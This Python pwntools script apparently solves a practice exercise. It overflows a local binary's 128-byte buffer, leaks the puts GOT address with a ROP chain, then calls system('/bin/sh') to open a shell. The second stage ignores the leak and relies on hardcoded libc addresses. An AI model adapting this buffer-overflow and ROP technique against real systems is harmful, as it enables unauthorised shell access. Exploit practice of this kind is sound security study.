#!/usr/bin/env python3

from pwn import *
import binascii


system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]
bin_sh_string = b"\x00\x00\x7F\xFF\xF7\xF6\xE8\x82"[::-1]

buffer = 128 * b"a"  # 0x61
backup_base_pointer = 8 * b"b"
backup_instruction_pointer = system_call

rop_pop_rdi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]
rop_puts = b"\x00\x00\x00\x00\x00\x40\x10\x30"[::-1]

double_pop_ret = b"\x00\x00\x00\x00\x00\x40\x12\x01"[::-1]
puts_got = b"\x00\x00\x00\x00\x00\x40\x3f\xc8"[::-1]
flush_got = b"\x00\x00\x00\x00\x00\x40\x3f\xd0"[::-1]
scanf_got = b"\x00\x00\x00\x00\x00\x40\x3f\xd8"[::-1]

copy_line4 = b"\x00\x00\x00\x00\x00\x40\x11\x46"[::-1]
main_line0 = b"\x00\x00\x00\x00\x00\x40\x11\x69"[::-1]


payload1 = (
    buffer
    + backup_base_pointer  # for padding.
    + rop_pop_rdi_ret
    + puts_got
    + rop_puts  # works with aslr.
    + main_line0
)

f = open("payload", "wb")
f.write(payload1)
f.close()

p = process("./bin")
raw_input(f"attach with gdb, then press enter:\ngdb -p {p.pid}")
r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
print(r)
p.sendline(payload1)
r = p.recvn(7)
print(binascii.b2a_hex(r))

r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
print(r)

payload2 = (
    buffer
    + backup_base_pointer
    + rop_pop_rdi_ret
    + bin_sh_string # aslr.
    + system_call # aslr.
    + exit_call # aslr.
)

p.sendline(payload2)

p.interactive()
